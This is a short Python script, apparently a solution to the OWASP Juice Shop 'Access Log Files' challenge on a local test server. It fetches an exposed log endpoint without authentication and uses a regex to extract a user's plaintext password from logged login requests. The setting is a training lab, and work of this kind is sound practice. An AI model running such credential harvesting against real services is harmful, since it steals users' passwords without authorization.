
import requests
import re

SERVER = 'http://localhost:3000'

def debug_fetch_logs():
    print("Fetching /support/logs...")
    
    s = requests.Session()
    # Login as admin needed? Usually Access Log Files challenge requires admin logic or no auth?
    # Let's try no auth first.
    
    try:
        res = s.get(f'{SERVER}/support/logs', headers={'Accept': 'application/json'}) # Try specific header
        
        print(f"Status: {res.status_code}")
        
        if res.ok:
            print("Access Log file content preview (last 500 chars):")
            print(res.text[-500:])
            
            # Simple regex to find the user J12934 and password
            # Format usually: ... POST /rest/user/login ... "email":"J12934@juice-sh.op","password":"..." ...
            match = re.search(r'J12934@juice-sh\.op.*?password":"(.*?)"', res.text)
            if match:
                password = match.group(1)
                print(f"\nFOUND CREDENTIALS: J12934@juice-sh.op : {password}")
            else:
                print("\nCould not find credentials in the log response.")
        else:
            print("Failed to access logs.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    debug_fetch_logs()
